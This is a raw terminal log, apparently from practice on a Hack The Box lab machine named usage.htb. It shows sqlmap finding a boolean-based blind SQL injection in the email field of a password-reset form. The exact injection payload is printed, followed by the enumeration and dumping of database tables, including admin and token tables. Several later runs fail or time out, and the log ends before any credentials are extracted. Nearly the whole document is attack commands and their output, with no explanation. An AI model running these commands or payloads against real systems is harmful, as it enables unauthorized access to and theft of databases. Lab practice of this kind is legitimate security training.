
```sh
┌──(kali㉿kali)-[~/thm/usage]
└─$ nano request.txt

┌──(kali㉿kali)-[~/thm/usage]
└─$ sqlmap -r request.txt --technique=B --level=5 --risk=3 --dbms=mysql --dbs --batch
        ___
       __H__                                                                                                                  
 ___ ___[,]_____ ___ ___  {1.8.3#stable}                                                                                      
|_ -| . [,]     | .'| . |                                                                                                     
|___|_  [(]_|_|_|__,|  _|                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:54:16 /2024-04-25/

[21:54:16] [INFO] parsing HTTP request from 'request.txt'
POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[21:54:16] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[21:54:19] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[21:54:21] [WARNING] POST parameter '_token' does not appear to be dynamic
[21:54:21] [WARNING] heuristic (basic) test shows that POST parameter '_token' might not be injectable
[21:54:23] [INFO] testing for SQL injection on POST parameter '_token'
[21:54:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:56:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[21:57:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[21:58:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[21:59:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[21:59:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[21:59:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[22:00:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[22:00:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:00:20] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[22:00:21] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[22:00:23] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[22:00:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[22:00:24] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[22:00:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[22:01:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[22:01:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[22:01:23] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[22:01:35] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[22:01:50] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[22:02:01] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[22:02:17] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[22:02:27] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:02:38] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:02:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[22:02:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[22:02:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[22:02:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[22:02:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[22:02:51] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[22:02:51] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[22:02:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[22:02:52] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[22:02:52] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[22:02:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[22:03:00] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[22:03:00] [WARNING] POST parameter '_token' does not seem to be injectable
[22:03:00] [WARNING] POST parameter 'email' does not appear to be dynamic
[22:03:00] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[22:03:00] [INFO] testing for SQL injection on POST parameter 'email'
[22:03:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:04:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[22:05:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[22:06:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[22:06:25] [INFO] POST parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[22:06:25] [INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1656 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=tvzDHT90bHURVbNB3X94WeliILj5EYxGZkbJEw30&email=test@test.test' AND 3165=(SELECT (CASE WHEN (3165=3165) THEN 3165 ELSE (SELECT 7692 UNION SELECT 5642) END))-- -
---
[22:06:39] [INFO] testing MySQL
[22:06:39] [INFO] confirming MySQL
[22:06:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[22:06:42] [INFO] fetching database names
[22:06:42] [INFO] fetching number of databases
[22:06:42] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:06:42] [INFO] retrieved: 3
[22:06:45] [INFO] retrieved: information_schema
[22:07:49] [INFO] retrieved: performance_schema
[22:08:51] [INFO] retrieved: usage_blog
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

[22:09:31] [WARNING] HTTP error codes detected during run:
419 (?) - 1335 times, 500 (Internal Server Error) - 252 times
[22:09:31] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/usage.htb'

[*] ending @ 22:09:31 /2024-04-25/

                                                                                                                              
┌──(kali㉿kali)-[~/thm/usage]
└─$ cd /home/kali/.local/share/sqlmap/output/         
                                                                                                                              
┌──(kali㉿kali)-[~/.local/share/sqlmap/output]
└─$ ls -la
total 12
drwxr-xr-x 3 kali kali 4096 Apr 25 21:54 .
drwxr-xr-x 4 kali kali 4096 Apr 25 21:54 ..
drwxr-xr-x 2 kali kali 4096 Apr 25 22:09 usage.htb
                                                                                                                              
┌──(kali㉿kali)-[~/.local/share/sqlmap/output]
└─$ mousepad usage.htb&                                       
[1] 1822161
                                                                                                                              
┌──(kali㉿kali)-[~/.local/share/sqlmap/output]
└─$ 
[1]  + done       mousepad usage.htb
┌──(kali㉿kali)-[~/.local/share/sqlmap/output]
└─$ cd usage.htb                             
                                                                                                                              
┌──(kali㉿kali)-[~/…/share/sqlmap/output/usage.htb]
└─$ ls -la
total 24
drwxr-xr-x 2 kali kali 4096 Apr 25 22:09 .
drwxr-xr-x 3 kali kali 4096 Apr 25 21:54 ..
-rw-r--r-- 1 kali kali  613 Apr 25 22:09 log
-rw-r--r-- 1 kali kali 8192 Apr 25 22:09 session.sqlite
-rw-r--r-- 1 kali kali  206 Apr 25 21:54 target.txt
                                                                                                                              
┌──(kali㉿kali)-[~/…/share/sqlmap/output/usage.htb]
└─$ mousepad log&      
[1] 1822493
                                                                                                                              
┌──(kali㉿kali)-[~/…/share/sqlmap/output/usage.htb]
└─$ sqlmap -r request.txt --technique=B --level=5 --risk=3 --dbms=mysql --dbs --batch --dump
        ___
       __H__                                                                                                                  
 ___ ___["]_____ ___ ___  {1.8.3#stable}                                                                                      
|_ -| . [)]     | .'| . |                                                                                                     
|___|_  [,]_|_|_|__,|  _|                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:16:34 /2024-04-25/

[22:16:34] [CRITICAL] specified HTTP request file 'request.txt' does not exist

[*] ending @ 22:16:34 /2024-04-25/

                                                                                                                              
┌──(kali㉿kali)-[~/…/share/sqlmap/output/usage.htb]
└─$ 
[1]  + done       mousepad log
┌──(kali㉿kali)-[~/…/share/sqlmap/output/usage.htb]
└─$ 
```

```sh
┌──(kali㉿kali)-[~/…/share/sqlmap/output/usage.htb]
└─$ cd ~                                                                                      
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request.txt --technique=B --level=5 --risk=3 --dbms=mysql --dbs --batch --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:17:18 /2024-04-25/

[22:17:18] [INFO] parsing HTTP request from 'request.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[22:17:18] [INFO] testing connection to the target URL
[22:17:18] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
[22:17:18] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
[22:17:18] [CRITICAL] unable to connect to the target URL ('Connection refused')

[*] ending @ 22:17:18 /2024-04-25/

                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request.txt --technique=B --level=5 --risk=3 --dbms=mysql --dbs --batch --dump
        ___
       __H__                                                                                                                  
 ___ ___[.]_____ ___ ___  {1.8.3#stable}                                                                                      
|_ -| . ["]     | .'| . |                                                                                                     
|___|_  [.]_|_|_|__,|  _|                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:17:58 /2024-04-25/

[22:17:58] [INFO] parsing HTTP request from 'request.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[22:17:58] [INFO] testing connection to the target URL
[22:17:58] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
[22:17:58] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
[22:17:58] [CRITICAL] unable to connect to the target URL ('Connection refused')

[*] ending @ 22:17:58 /2024-04-25/

                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request.txt --technique=B --level=5 --risk=3 --dbms=mysql --dbs --batch       
        ___
       __H__                                                                                                                  
 ___ ___[)]_____ ___ ___  {1.8.3#stable}                                                                                      
|_ -| . [']     | .'| . |                                                                                                     
|___|_  [,]_|_|_|__,|  _|                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:18:05 /2024-04-25/

[22:18:05] [INFO] parsing HTTP request from 'request.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[22:18:05] [INFO] testing connection to the target URL
[22:18:05] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
[22:18:05] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
[22:18:06] [CRITICAL] unable to connect to the target URL ('Connection refused')

[*] ending @ 22:18:06 /2024-04-25/

                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ cd thm
                                                                                                                              
┌──(kali㉿kali)-[~/thm]
└─$ cd usage 
                                                                                                                              
┌──(kali㉿kali)-[~/thm/usage]
└─$ ls -la
total 12
drwxr-xr-x  2 kali kali 4096 Apr 25 21:52 .
drwxr-xr-x 16 kali kali 4096 Apr 25 21:52 ..
-rw-r--r--  1 kali kali 1284 Apr 25 21:52 request.txt
                                                                                                                              
┌──(kali㉿kali)-[~/thm/usage]
└─$ sqlmap -r request.txt --technique=B --level=5 --risk=3 --dbms=mysql --dbs --batch       
        ___
       __H__                                                                                                                  
 ___ ___[']_____ ___ ___  {1.8.3#stable}                                                                                      
|_ -| . [)]     | .'| . |                                                                                                     
|___|_  [']_|_|_|__,|  _|                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:19:04 /2024-04-25/

[22:19:04] [INFO] parsing HTTP request from 'request.txt'
POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[22:19:05] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=tvzDHT90bHURVbNB3X94WeliILj5EYxGZkbJEw30&email=test@test.test' AND 3165=(SELECT (CASE WHEN (3165=3165) THEN 3165 ELSE (SELECT 7692 UNION SELECT 5642) END))-- -
---
[22:19:06] [INFO] testing MySQL
[22:19:06] [INFO] confirming MySQL
[22:19:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[22:19:06] [INFO] fetching database names
[22:19:06] [INFO] fetching number of databases
[22:19:06] [INFO] resumed: 3
[22:19:06] [INFO] resumed: information_schema
[22:19:06] [INFO] resumed: performance_schema
[22:19:06] [INFO] resumed: usage_blog
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

[22:19:06] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/usage.htb'

[*] ending @ 22:19:06 /2024-04-25/

                                                                                                                              
┌──(kali㉿kali)-[~/thm/usage]
└─$ sqlmap -r request.txt --technique=B --level=5 --risk=3 --dbms=mysql --dbs --batch --dump
        ___
       __H__                                                                                                                  
 ___ ___[)]_____ ___ ___  {1.8.3#stable}                                                                                      
|_ -| . [(]     | .'| . |                                                                                                     
|___|_  [,]_|_|_|__,|  _|                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:19:13 /2024-04-25/

[22:19:13] [INFO] parsing HTTP request from 'request.txt'
POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[22:19:13] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=tvzDHT90bHURVbNB3X94WeliILj5EYxGZkbJEw30&email=test@test.test' AND 3165=(SELECT (CASE WHEN (3165=3165) THEN 3165 ELSE (SELECT 7692 UNION SELECT 5642) END))-- -
---
[22:19:14] [INFO] testing MySQL
[22:19:14] [INFO] confirming MySQL
[22:19:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[22:19:14] [INFO] fetching database names
[22:19:14] [INFO] fetching number of databases
[22:19:14] [INFO] resumed: 3
[22:19:14] [INFO] resumed: information_schema
[22:19:14] [INFO] resumed: performance_schema
[22:19:14] [INFO] resumed: usage_blog
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

[22:19:14] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[22:19:14] [INFO] fetching current database
[22:19:14] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:19:14] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
usage_blog
[22:19:48] [INFO] fetching tables for database: 'usage_blog'
[22:19:48] [INFO] fetching number of tables for database 'usage_blog'
[22:19:48] [INFO] retrieved: 15
[22:19:52] [INFO] retrieved: admin_menu
[22:20:25] [INFO] retrieved: admin_operation_log
[22:21:22] [INFO] retrieved: admin_permissions
[22:22:06] [INFO] retrieved: admin_role_menu
[22:22:51] [INFO] retrieved: admin_role_permissions
[22:23:39] [INFO] retrieved: admin_role_users
[22:24:09] [INFO] retrieved: admin_roles
[22:24:21] [INFO] retrieved: admin_user_permissions
[22:25:26] [INFO] retrieved: admin_users
[22:25:37] [INFO] retrieved: blog
[22:25:51] [INFO] retrieved: failed_jobs
[22:26:32] [INFO] retrieved: migrations
[22:27:09] [INFO] retrieved: password_reset_tokens
[22:28:32] [INFO] retrieved: personal_access_tokens
[22:29:46] [INFO] retrieved: users
[22:30:05] [INFO] fetching columns for table 'failed_jobs' in database 'usage_blog'
[22:30:05] [INFO] retrieved: 7
[22:30:08] [INFO] retrieved: id
[22:30:16] [INFO] retrieved: uuid
[22:30:30] [INFO] retrieved: connection
[22:31:07] [INFO] retrieved: queue
[22:31:24] [INFO] retrieved: payload
[22:31:49] [INFO] retrieved: exception
[22:32:24] [INFO] retrieved: failed_at
[22:32:54] [INFO] fetching entries for table 'failed_jobs' in database 'usage_blog'
[22:32:54] [INFO] fetching number of entries for table 'failed_jobs' in database 'usage_blog'
[22:32:54] [INFO] retrieved: 0
[22:32:57] [WARNING] table 'failed_jobs' in database 'usage_blog' appears to be empty
Database: usage_blog
Table: failed_jobs
[0 entries]
+----+------+-------+---------+-----------+-------------+--------------+
| id | uuid | queue | payload | failed_at | exception   | connection   |
+----+------+-------+---------+-----------+-------------+--------------+
+----+------+-------+---------+-----------+-------------+--------------+

[22:32:57] [INFO] table 'usage_blog.failed_jobs' dumped to CSV file '/home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/failed_jobs.csv'                                                                                                       
[22:32:57] [INFO] fetching columns for table 'admin_user_permissions' in database 'usage_blog'
[22:32:57] [INFO] retrieved: 4
[22:32:59] [INFO] retrieved: user_id
[22:33:27] [INFO] retrieved: permission_id
[22:34:11] [INFO] retrieved: created_at
[22:34:44] [INFO] retrieved: updated_at
[22:35:25] [INFO] fetching entries for table 'admin_user_permissions' in database 'usage_blog'
[22:35:25] [INFO] fetching number of entries for table 'admin_user_permissions' in database 'usage_blog'
[22:35:25] [INFO] retrieved: 0
[22:35:28] [WARNING] table 'admin_user_permissions' in database 'usage_blog' appears to be empty
Database: usage_blog
Table: admin_user_permissions
[0 entries]
+---------+---------------+------------+------------+
| user_id | permission_id | created_at | updated_at |
+---------+---------------+------------+------------+
+---------+---------------+------------+------------+

[22:35:28] [INFO] table 'usage_blog.admin_user_permissions' dumped to CSV file '/home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_user_permissions.csv'                                                                                 
[22:35:28] [INFO] fetching columns for table 'migrations' in database 'usage_blog'
[22:35:28] [INFO] retrieved: 3
[22:35:31] [INFO] retrieved: id
[22:35:37] [INFO] retrieved: migration
[22:36:04] [INFO] retrieved: batch
[22:36:20] [INFO] fetching entries for table 'migrations' in database 'usage_blog'
[22:36:20] [INFO] fetching number of entries for table 'migrations' in database 'usage_blog'
[22:36:20] [INFO] retrieved: 6
[22:36:24] [INFO] retrieved: 1
[22:36:29] [INFO] retrieved: 1
[22:36:33] [INFO] retrieved: 2014_10_12_000000_create_users_table
[22:38:25] [INFO] retrieved: 1
[22:38:28] [INFO] retrieved: 2
[22:38:31] [INFO] retrieved: 2014_10_12_100000_create_password_reset_tokens_table
[22:40:54] [INFO] retrieved: 1
[22:40:56] [INFO] retrieved: 3
[22:41:00] [INFO] retrieved: 2019_08_19_000000_create_failed_jobs_table
[22:43:16] [INFO] retrieved: 1
[22:43:19] [INFO] retrieved: 4
[22:43:23] [INFO] retrieved: 2019_12_14_000001_create_personal_access_tokens_table
[22:46:11] [INFO] retrieved: 2
[22:46:14] [INFO] retrieved: 5
[22:46:17] [INFO] retrieved: 2023_08_12_130552_create_blogs_table
[22:48:26] [INFO] retrieved: 3
[22:48:30] [INFO] retrieved: 6
[22:48:34] [INFO] retrieved: 2016_01_04_173148_create_admin_tables
Database: usage_blog
Table: migrations
[6 entries]
+----+-------+-------------------------------------------------------+
| id | batch | migration                                             |
+----+-------+-------------------------------------------------------+
| 1  | 1     | 2014_10_12_000000_create_users_table                  |
| 2  | 1     | 2014_10_12_100000_create_password_reset_tokens_table  |
| 3  | 1     | 2019_08_19_000000_create_failed_jobs_table            |
| 4  | 1     | 2019_12_14_000001_create_personal_access_tokens_table |
| 5  | 2     | 2023_08_12_130552_create_blogs_table                  |
| 6  | 3     | 2016_01_04_173148_create_admin_tables                 |
+----+-------+-------------------------------------------------------+

[22:50:36] [INFO] table 'usage_blog.migrations' dumped to CSV file '/home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/migrations.csv'                                                                                                         
[22:50:37] [INFO] fetching columns for table 'admin_roles' in database 'usage_blog'
[22:50:36] [INFO] retrieved: 5
[22:50:40] [INFO] retrieved: id
[22:50:54] [INFO] retrieved: name
[22:51:17] [INFO] retrieved: slug
[22:51:46] [INFO] retrieved: created_at
[22:52:59] [INFO] retrieved: updated_at
[22:54:07] [INFO] fetching entries for table 'admin_roles' in database 'usage_blog'
[22:54:07] [INFO] fetching number of entries for table 'admin_roles' in database 'usage_blog'
[22:54:07] [INFO] retrieved: 1
[22:54:10] [INFO] retrieved: Administrator
[22:55:15] [INFO] retrieved: 2023-08-13 02:48:26
[22:57:23] [INFO] retrieved: 1
[22:57:29] [INFO] retrieved: administrator
[22:58:03] [INFO] retrieved: 2023-08-13 02:48:26
Database: usage_blog
Table: admin_roles
[1 entry]
+----+---------------+---------------+---------------------+---------------------+
| id | slug          | name          | created_at          | updated_at          |
+----+---------------+---------------+---------------------+---------------------+
| 1  | administrator | Administrator | 2023-08-13 02:48:26 | 2023-08-13 02:48:26 |
+----+---------------+---------------+---------------------+---------------------+

[22:59:12] [INFO] table 'usage_blog.admin_roles' dumped to CSV file '/home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_roles.csv'                                                                                                       
[22:59:12] [INFO] fetching columns for table 'admin_role_menu' in database 'usage_blog'
[22:59:12] [INFO] retrieved: 4
[22:59:15] [INFO] retrieved: role_id
[22:59:42] [INFO] retrieved: menu_id
[23:00:08] [INFO] retrieved: created_at
[23:00:38] [INFO] retrieved: updated_at
[23:01:16] [INFO] fetching entries for table 'admin_role_menu' in database 'usage_blog'
[23:01:16] [INFO] fetching number of entries for table 'admin_role_menu' in database 'usage_blog'
[23:01:16] [INFO] retrieved: 1
[23:01:18] [INFO] retrieved:  
[23:01:23] [INFO] retrieved: 2
[23:01:27] [INFO] retrieved: 1
[23:01:29] [INFO] retrieved:  
Database: usage_blog
Table: admin_role_menu
[1 entry]
+---------+---------+------------+------------+
| menu_id | role_id | created_at | updated_at |
+---------+---------+------------+------------+
| 2       | 1       | NULL       | NULL       |
+---------+---------+------------+------------+

[23:01:34] [INFO] table 'usage_blog.admin_role_menu' dumped to CSV file '/home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_role_menu.csv'                                                                                               
[23:01:34] [INFO] fetching columns for table 'personal_access_tokens' in database 'usage_blog'
[23:01:34] [INFO] retrieved: 10
[23:01:39] [INFO] retrieved: id
[23:01:44] [INFO] retrieved: tokenable_type
[23:02:49] [INFO] retrieved: tokenable_id
[23:03:23] [INFO] retrieved: na
[23:04:29] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:05:59] [CRITICAL] connection timed out to the target URL
[23:05:59] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2590 times

[*] ending @ 23:05:59 /2024-04-25/

                                                                                                                              
┌──(kali㉿kali)-[~/thm/usage]
└─$ sqlmap -r request.txt --technique=B --level=5 --risk=3 --dbms=mysql --dbs --batch --dump
        ___
       __H__                                                                                                                  
 ___ ___[']_____ ___ ___  {1.8.3#stable}                                                                                      
|_ -| . [']     | .'| . |                                                                                                     
|___|_  [,]_|_|_|__,|  _|                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:37:51 /2024-04-25/

[23:37:51] [INFO] parsing HTTP request from 'request.txt'
POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[23:37:52] [INFO] testing connection to the target URL
[23:38:22] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:38:22] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
^C

[*] ending @ 23:39:15 /2024-04-25/

                                                                                                                              
┌──(kali㉿kali)-[~/thm/usage]
└─$ sqlmap -r request.txt --technique=B --level=5 --risk=3 --dbms=mysql --dbs               
        ___
       __H__                                                                                                                  
 ___ ___[']_____ ___ ___  {1.8.3#stable}                                                                                      
|_ -| . [)]     | .'| . |                                                                                                     
|___|_  [.]_|_|_|__,|  _|                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:39:40 /2024-04-25/

[23:39:40] [INFO] parsing HTTP request from 'request.txt'
POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] 

Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] 

[23:39:57] [INFO] testing connection to the target URL
[23:40:27] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:40:27] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
[23:41:57] [CRITICAL] connection timed out to the target URL

[*] ending @ 23:41:57 /2024-04-25/

                                                                                                                              
┌──(kali㉿kali)-[~/thm/usage]
└─$ 
```

